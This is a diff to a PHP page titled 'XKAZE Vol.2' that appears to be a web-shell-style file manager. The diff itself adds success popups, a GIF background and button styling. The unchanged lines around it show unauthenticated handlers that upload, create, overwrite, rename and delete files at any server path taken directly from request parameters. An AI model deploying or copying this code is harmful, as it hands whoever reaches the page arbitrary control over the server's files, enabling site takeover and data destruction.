@@ -12,19 +12,19 @@ function safe($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
 
 if (isset($_POST['newfolder']) && $_POST['newfolder'] !== "") {
     mkdir($path . "/" . basename($_POST['newfolder']));
-    header("Location: ?path=$path");
+    header("Location: ?path=$path&create_folder_success=1");
     exit;
 }
 
 if (isset($_POST['newfile']) && $_POST['newfile'] !== "") {
     file_put_contents($path . "/" . basename($_POST['newfile']), "");
-    header("Location: ?path=$path");
+    header("Location: ?path=$path&create_file_success=1");
     exit;
 }
 
 if (!empty($_FILES['upfile']['name'])) {
     move_uploaded_file($_FILES['upfile']['tmp_name'], $path . "/" . basename($_FILES['upfile']['name']));
-    header("Location: ?path=$path");
+    header("Location: ?path=$path&upload_success=1");
     exit;
 }
 
@@ -32,7 +32,7 @@ if (isset($_GET['delete'])) {
     $target = $_GET['delete'];
     if (is_file($target)) unlink($target);
     elseif (is_dir($target)) rmdir($target);
-    header("Location: ?path=" . dirname($target));
+    header("Location: ?path=" . dirname($target) . "&delete_success=1");
     exit;
 }
 
@@ -40,13 +40,13 @@ if (isset($_POST['rename_from'])) {
     $old = $_POST['rename_from'];
     $new = dirname($old) . "/" . basename($_POST['rename_to']);
     rename($old, $new);
-    header("Location: ?path=" . dirname($old));
+    header("Location: ?path=" . dirname($old) . "&rename_success=1");
     exit;
 }
 
 if (isset($_POST['edit_file'])) {
     file_put_contents($_POST['edit_file'], $_POST['content']);
-    header("Location: ?path=" . dirname($_POST['edit_file']));
+    header("Location: ?path=" . dirname($_POST['edit_file']) . "&edit_file_success=1");
     exit;
 }
 
@@ -242,73 +242,215 @@ a:hover {
     color: #ff4081; /* Warna saat hover */
 }
 
-body { 
-    font‑family: "Roboto", Arial, sans‑serif;
-    background:#101010; 
-    color:#eee; 
-    font-family:Arial; 
-    padding:20px; 
+body {
+    background: url('https://twistedsifter.com/wp-content/uploads/2013/05/animated-gifs-of-fighting-game-backgrounds-25.gif') no-repeat center center fixed;
+    background-size: cover;
+    color: #eee;
+    padding: 20px;
+    font-family: "Roboto", Arial, sans-serif;
 }
 
-a { 
-    color:#4fc3f7; 
-    text-decoration:none; 
+body {
+    background: url('https://twistedsifter.com/wp-content/uploads/2013/05/animated-gifs-of-fighting-game-backgrounds-25.gif') no-repeat center center fixed;
+    background-size: cover;
+    color: #ddd; /* Teks lebih terang */
+    padding: 20px;
+    font-family: "Roboto", Arial, sans-serif;
 }
 
 table {
-    border-collapse: collapse;
-    width: 80%;
+    width: 60%;
     margin: 0 auto;
     margin-top: 15px;
+    border-radius: 8px;
+    overflow: hidden;
+    background: #1e1e1e; /* Background solid yang lebih gelap */
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3); /* Menambahkan bayangan lebih jelas */
 }
 
-td, th { 
-    border:1px solid #444; 
-    padding:8px; 
+th, td {
+    padding: 15px;
+    text-align: left;
+    color: #ddd; /* Warna teks dalam tabel */
 }
 
 tr:nth-child(even) { 
-    background:#181818; 
+    background: #222; /* Warna baris genap lebih gelap */
+}
+
+tr:hover {
+    background: #333; /* Efek hover baris */
 }
 
 input, button, textarea { 
-    background:#222; 
-    color:#fff; 
-    border:1px solid #555; 
-    padding:5px; 
+    background: #333; /* Elemen input lebih gelap */
+    color: #fff; 
+    border: 1px solid #555; 
+    padding: 5px; 
 }
 
 button {
-    background: none;
-    border: none;
-    cursor: pointer;
+    background: #4fc3f7; /* Warna biru terang untuk tombol */
+    color: white; /* Teks tombol menjadi putih */
+    border: none; /* Menghilangkan border */
+    padding: 12px 25px; /* Padding lebih besar supaya tombol lebih besar */
+    font-size: 16px; /* Ukuran font lebih besar */
+    font-weight: bold; /* Teks lebih tebal */
+    border-radius: 10px; /* Sudut tombol lebih melengkung */
+    cursor: pointer; /* Pointer saat hover */
+    transition: all 0.3s ease; /* Efek transisi yang smooth */
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Efek bayangan halus */
+    display: inline-flex; /* Agar ikon dan teks terlihat sejajar */
+    align-items: center; /* Menjaga ikon dan teks sejajar secara vertikal */
+    justify-content: center; /* Menjaga ikon dan teks sejajar secara horizontal */
+}
+
+button:hover {
+    background: #ff4081; /* Warna tombol berubah saat hover */
+    transform: translateY(-4px); /* Efek tombol naik sedikit saat hover */
+    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3); /* Bayangan lebih besar saat hover */
+}
+
+button:active {
+    background: #f50057; /* Warna tombol berubah saat ditekan */
+    transform: translateY(2px); /* Efek tombol turun sedikit saat ditekan */
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2); /* Bayangan lebih kecil saat ditekan */
 }
 
 button i {
-    font-size: 28px; 
-    color: #4fc3f7;
+    font-size: 20px; /* Ukuran ikon dalam tombol */
+    margin-right: 8px; /* Memberi sedikit jarak antara ikon dan teks */
+    color: white; /* Ikon berwarna putih */
 }
 
+button span {
+    font-size: 16px; /* Ukuran teks untuk tombol */
+    color: white; /* Teks tombol berwarna putih */
+}
+
+
 .folder { 
-    color:#7cff7c; 
-    font-weight:bold; 
+    color: #7cff7c; 
+    font-weight: bold; 
 }
 
 .file { 
-    color:#ccc; 
+    color: #ccc; 
 }
 
 .breadcrumb a { 
-    color:#7cffea; 
+    color: #7cffea; 
 }
 
-/* Set lebar kolom "Updated" */
 th:nth-child(4), td:nth-child(4) {
-    width: 150px;  /* Sesuaikan dengan ukuran yang diinginkan */
+    width: 150px;
 }
+
+/* Modal styles */
+.modal {
+    display: none; /* Hide modal by default */
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+.modal-content {
+    background: #ffffff;
+    padding: 30px;
+    border-radius: 10px;
+    text-align: center;
+    max-width: 400px;
+    width: 100%;
+    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Soft shadow for better depth */
+}
+
+.modal-header .close-btn {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 30px;
+    color: #aaa;
+    cursor: pointer;
+}
+
+.modal-header .close-btn:hover {
+    color: #333;
+}
+
+.checkmark {
+    margin: 20px auto;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background-color: #d4edda;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.checkmark svg {
+    fill: #28a745;
+}
+
+h2 {
+    font-size: 24px;
+    color: #4CAF50;
+    font-weight: bold;
+    margin-top: 10px;
+}
+
+p {
+    color: #666;
+    font-size: 16px;
+    margin-bottom: 20px;
+}
+
+.ok-btn {
+    padding: 10px 20px;
+    background-color: #4CAF50;
+    border: none;
+    color: white;
+    font-size: 16px;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.ok-btn:hover {
+    background-color: #45a049;
+}
+
+
 </style>
 </head>
 <body>
+
+<div id="success-modal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <span class="close-btn" onclick="closeModal()">&times;</span>
+        </div>
+        <div class="modal-body">
+            <div class="checkmark">
+                <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 100 100">
+                    <circle cx="50" cy="50" r="45" stroke="none" stroke-width="5" fill="#d4edda"/>
+                    <path fill="none" stroke="#28a745" stroke-width="5" d="M35 50 L45 60 L65 40"/>
+                </svg>
+            </div>
+            <h2>Success</h2>
+            <p id="success-message">Action Completed Successfully!</p>
+            <button class="ok-btn" onclick="closeModal()">OK</button>
+        </div>
+    </div>
+</div>
+
 
 <h2>📂 XKAZE Vol.2</h2>
 
@@ -357,8 +499,8 @@ style="
     font-family:monospace;
 ">
 
-
-
+<br>
+<br>
 <div id="folder-form" style="display:none;">
     <form method="POST">
         <input type="text" name="newfolder" id="folder-name" placeholder="Masukkan nama folder">
@@ -612,6 +754,77 @@ document.getElementById('upload-file').addEventListener('click', function() {
     // Menampilkan form upload file saat tombol diklik
     document.getElementById('upload-form').style.display = 'block';
 });
+
+
+// Function to show the modal
+function showSuccessPopup(message) {
+    const modal = document.getElementById("success-modal");
+    const messageElement = document.getElementById("success-message");
+    
+    // Set the message text
+    messageElement.innerHTML = message;
+    
+    // Display the modal
+    modal.style.display = "flex";
+}
+
+// Function to close the modal
+function closeModal() {
+    const modal = document.getElementById("success-modal");
+    modal.style.display = "none";
+}
+
+window.onload = function() {
+    const urlParams = new URLSearchParams(window.location.search);
+
+    // Jika ada parameter 'create_folder_success' di URL
+    if (urlParams.has('create_folder_success')) {
+        showSuccessPopup("Folder Created Successfully!");
+    }
+
+    // Jika ada parameter 'create_file_success' di URL
+    if (urlParams.has('create_file_success')) {
+        showSuccessPopup("File Created Successfully!");
+    }
+
+    // Jika ada parameter 'upload_success' di URL
+    if (urlParams.has('upload_success')) {
+        showSuccessPopup("File Uploaded Successfully!");
+    }
+
+    // Jika ada parameter 'delete_success' di URL
+    if (urlParams.has('delete_success')) {
+        showSuccessPopup("File/Folder Deleted Successfully!");
+    }
+
+    // Jika ada parameter 'rename_success' di URL
+    if (urlParams.has('rename_success')) {
+        showSuccessPopup("File/Folder Renamed Successfully!");
+    }
+
+    // Jika ada parameter 'edit_file_success' di URL
+    if (urlParams.has('edit_file_success')) {
+        showSuccessPopup("File Edited Successfully!");
+    }
+};
+
+// Fungsi untuk menampilkan pop-up sukses
+function showSuccessPopup(message) {
+    const modal = document.getElementById("success-modal");
+    const messageElement = document.getElementById("success-message");
+
+    // Set message text
+    messageElement.innerHTML = message;
+
+    // Display the modal
+    modal.style.display = "flex";
+}
+
+// Fungsi untuk menutup modal
+function closeModal() {
+    const modal = document.getElementById("success-modal");
+    modal.style.display = "none";
+}
 
 </script>
 
